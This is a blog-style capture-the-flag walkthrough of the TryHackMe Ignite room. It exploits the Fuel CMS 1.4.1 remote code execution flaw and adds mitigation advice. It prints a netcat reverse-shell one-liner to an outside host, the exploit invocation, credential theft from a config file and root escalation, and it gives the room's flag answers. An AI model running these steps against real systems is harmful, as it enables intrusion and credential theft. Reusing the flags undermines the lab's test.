---
title: "TryHackMe Ignite Room Walkthrough: Exploiting Fuel CMS 1.4.1 RCE"
date: 2024-03-17
author: "Notes By Nisha"
excerpt: "Walkthrough of TryHackMe's Ignite room where we exploit a Remote Code Execution vulnerability in Fuel CMS 1.4.1 (CVE-2018-16763). Learn the steps of enumeration, exploitation, privilege escalation, and defense strategies."
toc: true
toc_label: "Table of Contents"
toc_icon: "list-alt"
categories:
  - Blog
tags:
  - Cybersecurity
  - Offensive
  - Red Team
  - Penetration Testing
  - Ethical Hacking
  - TryHackMe
  - Remote Code Execution (RCE)
  - CTF
tagline: "A new start-up has a few issues with their web server."
header:
  image: /assets/images/00-hero.jpg
  # caption: ""
  teaser: /assets/images/thm/ctf/ignite-00.png
  overlay_image: /assets/images/00-hero.jpg
  overlay_filter: rgba(0, 0, 0, 0.5)
---


## Table of Contents
1. [Enumeration](#enumeration)  
2. [Vulnerability Discovery](#vulnerability-discovery)  
3. [Understanding the Exploit](#understanding-the-exploit)  
4. [Exploit Execution](#exploit-execution)  
5. [Post Exploitation](#post-exploitation)  
6. [Privilege Escalation](#privilege-escalation)  
7. [Mitigation and Defense](#mitigation-and-defense)

---

In this TryHackMe Ignite room walkthrough, I exploit a Remote Code Execution (RCE) vulnerability in Fuel CMS version 1.4.1 (CVE-2018-16763). The objective was to gain command execution on the target, understand how the exploit works, and identify ways to defend against such vulnerabilities.

👉 [TryHackMe Ignite Room](https://tryhackme.com/room/ignite)

---

## Enumeration

The first step was to identify open ports and services running on the target machine.

```bash
nmap -p- -T4 -vv 10.10.95.244
```

<img src="/assets/images/thm/ctf/ignite-02.png">



The scan revealed that port 80 was open and running Apache httpd 2.4.18.

After discovering that port 80 was open, I entered the target's IP address in the browser. This revealed the Fuel CMS Getting Started page, which disclosed:

- The CMS version (1.4.1)
- Details about installation and configuration directories


I performed a service enumeration scan to gather more information.

```bash
nmap -sC -sV -p80 10.10.95.244
```
<img src="/assets/images/thm/ctf/ignite-03.png">


### Findings:

- The web service was hosting FUEL CMS
- robots.txt contained one disallowed entry: /fuel (the CMS login page)

<img src="/assets/images/thm/ctf/ignite-04.png">

<img src="/assets/images/thm/ctf/ignite-05.png">


Navigating to /fuel presented the login portal.

<img src="/assets/images/thm/ctf/ignite-04-fuel.png">

The Getting Started page revealed default credentials:

<img src="/assets/images/thm/ctf/ignite-04-2.png">

<img src="/assets/images/thm/ctf/ignite-04-5.png">



I logged in successfully and gained access to the Fuel CMS admin dashboard. After browsing through Pages, Blocks, Assets, Users, and Settings, there were no immediate points for further exploitation.

<img src="/assets/images/thm/ctf/ignite-06.png">


## Vulnerability Discovery
The target was running Fuel CMS 1.4.1, which is known to have a Remote Code Execution (RCE) vulnerability.



A Google search quickly led me to Exploit-DB:

👉[Exploit-DB CVE-2018-16763](https://www.exploit-db.com/exploits/50477)
 

<img src="/assets/images/thm/ctf/ignite-07.png">

I also found the same exploit using searchsploit:

```bash
searchsploit fuel cms
searchsploit -m php/webapps/50477.py
```
<img src="/assets/images/thm/ctf/ignite-08.png">

<img src="/assets/images/thm/ctf/ignite-09.png">


## Understanding the Exploit

This vulnerability lies in improper input validation on the filter parameter in the /fuel/pages/select/ endpoint.
It allows arbitrary PHP code injection, resulting in Remote Code Execution (RCE).

- Root Cause: Lack of input validation in the filter parameter
- Security Impact: Execution of arbitrary system commands by an unauthenticated attacker

### Exploit Execution
After importing the exploit code locally, I executed it against the target.

```bash
python3 50477.py -u http://10.10.95.244
```


The exploit provided an interactive shell-like interface. I ran the following commands to confirm remote code execution:

```bash
ls
sudo -l
whoami
id
```
<img src="/assets/images/thm/ctf/ignite-10.png">

During this phase, I observed some unusual behavior. Running sudo -l returned the word system instead of the expected output. This was likely due to the exploit leveraging the PHP system() function, causing inconsistent responses.

Despite this, I confirmed command execution as the www-data user.

### Post Exploitation

Once confirmed as the www-data user, I enumerated the environment.

I recalled the CMS homepage mentioned that database credentials were located in:
fuel/application/config/database.php


I accessed the file and retrieved the credentials.

```bash
cat fuel/application/config/database.php
```

<img src="/assets/images/thm/ctf/ignite-11.png">
<img src="/assets/images/thm/ctf/ignite-12.png">

With these credentials, an attacker could:

- Access the backend database
- Dump sensitive data
- Attempt credential reuse for privilege escalation

Further enumeration revealed a flag in /home/www-data/:

```bash
ls /home/www-data
cat /home/www-data/flag.txt
```

Contents of flag.txt:


6470e394cbf6dab6a91682cc8585059b

<img src="/assets/images/thm/ctf/ignite-13.png">

For stability, I spawned a reverse shell using nc:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.2.119.123 1234 > /tmp/f
```

### Privilege Escalation

I attempted to escalate privileges to the root user.

Running su root gave me the error:

"must be run from a terminal"

I fixed this by spawning a pseudo-terminal:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
<img src="/assets/images/thm/ctf/ignite-14.png">

I then retried su root using the database credentials:

<img src="/assets/images/thm/ctf/ignite-14.png">

Successful! I was now root.

```bash
id
cat /root/root.txt
```

I retrieved the root flag from /root/root.txt:



### Root flag:

b9bbcb33e11b80be759c4e844862482d

## Mitigation and Defense

To prevent similar attacks:

### Patch Management
- Regularly update to the latest version of Fuel CMS. This vulnerability is fixed in versions above 1.4.1.

### Input Validation
- Sanitize and validate all user inputs, especially in query parameters.

### Disable Dangerous PHP Functions
- In your php.ini, disable functions such as eval(), system(), and exec() unless absolutely necessary. Test thoroughly to ensure application functionality.

### Least Privilege Principle
- Run services with the least privileges necessary. Limit access to sensitive directories and files.

### Web Application Firewall (WAF)
Use WAFs to detect and block malicious payloads before they reach the application.

This Ignite room was a solid reminder that poor coding practices and outdated software expose serious vulnerabilities.
Simple input validation failures can lead to complete system compromise.

➡️ Stay patched. Stay vigilant.

🙌 Thanks for reading!
Follow me for more hands-on cybersecurity content, CTF write-ups, and practical tutorials.

🔗 TryHackMe Ignite Room
🛡️ #NotesByNisha | #TryHackMe | #CTF | #PenetrationTesting | #RedTeam | #CyberSecurity


